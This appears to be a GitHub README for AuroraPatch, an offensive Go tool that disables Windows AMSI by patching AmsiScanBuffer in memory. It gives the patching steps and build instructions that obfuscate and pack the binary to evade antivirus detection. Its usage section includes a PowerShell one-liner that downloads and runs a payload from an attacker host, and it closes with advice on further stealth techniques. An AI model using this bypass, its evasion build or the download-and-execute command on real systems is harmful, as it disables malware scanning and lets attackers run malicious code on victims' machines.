# AuroraPatch: AMSI Bypass Tool in Go

![Go](https://img.shields.io/badge/Go-1.24.2-blue)
![License](https://img.shields.io/github/license/grisuno/amsi)

**AuroraPatch** is a lightweight, offensive Go tool that bypasses Windows AMSI (Anti-Malware Scan Interface) by patching the `AmsiScanBuffer` function in memory. Designed for red teamers and security researchers, it allows execution of scripts that would otherwise be blocked by Defender or other AMSI-integrated AVs.

> ⚠️ **For authorized use only.**  
> This tool is intended for penetration testing, ethical hacking, and educational purposes.

---

## 🌟 What is AMSI?

AMSI (Anti-Malware Scan Interface) is a Windows security feature that enables antivirus solutions to scan scripts (PowerShell, WMI, etc.) in real time. AuroraPatch demonstrates how AMSI can be bypassed by directly modifying memory in the current process.

---

## 🔧 How It Works

AuroraPatch performs the following steps:
1. Loads `amsi.dll` dynamically.
2. Resolves the address of `AmsiScanBuffer`.
3. Changes memory permissions using `VirtualProtectEx`.
4. Patches the first byte of `AmsiScanBuffer` with `0xC3` (`ret` instruction).
5. Restores original memory permissions.

## Result:  
✅ `AmsiScanBuffer` returns immediately — no scan occurs.  
🛡️ Effective for bypassing AMSI during post-exploitation.

> 🔁 **In-memory only**: Patch is volatile and lasts only for the current process.

---

## ⚠️ Legal & Ethical Disclaimer

This tool is **strictly for educational and authorized security assessments**.  
Unauthorized use may violate laws or regulations.  
The author assumes **no liability** for misuse.

---

## 🛠️ Build Instructions

Compiles to a Windows executable using cross-compilation, obfuscation (`garble`), and compression (`UPX`).

### Prerequisites
- Go 1.24.2+
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- `garble` (Go obfuscator)
- `upx`

Install `garble`:
```bash
go install github.com/burrowers/garble@latest
```
Build (from Linux/WSL)
```bash
make windows
```
or just:

```bash
./install.sh
```


Output:
amsi.exe  # Obfuscated, compressed Windows executable

- ✅ Binary is obfuscated with garble -literals -tiny and packed with UPX to reduce detection. 

## ▶️ Usage

Run on target Windows system:

```cmd
amsi.exe
```

```powershell
.\amsi.exe
```

Expected output:
```cmd
[+] AMSI patched: AmsiScanBuffer replaced with ret
AMSI bypass successful. Test with PowerShell or WMI scripts.
```
Now execute blocked scripts:
```powershell
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

🔄 Patch only affects the current process. Restarting restores AMSI protection. 

## 🧹 Clean Build Artifacts

```bash
make clean
```

## 📂 Project Structure

```text
├── amsi.go        # Main logic: AMSI patching via Windows API
├── go.mod         # Go module definition
├── go.sum         # Dependency checksums
└── Makefile       # Cross-compilation and obfuscation rules
```

## 🧲 Technical Details
- Uses golang.org/x/sys/windows for low-level Windows API access.
- No external dependencies beyond standard Go and x/sys.
- Direct memory manipulation via:
- LoadLibrary / GetProcAddress
- OpenProcess
- VirtualProtectEx
- WriteProcessMemory

## 🛑 Detection & Evasion
- Static (AV)
- Reduced via
- garble + UPX
- Dynamic (EDR)
- May trigger on memory RWX, process injection
- Persistence
- None (in-memory only)

💡 Tip: Combine with other evasion techniques (sleep masking, API unhooking, etc.) for better stealth.

## 📚 References
- Microsoft AMSI Docs
- garble - Go Obfuscator
- UPX Executable Packer


![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
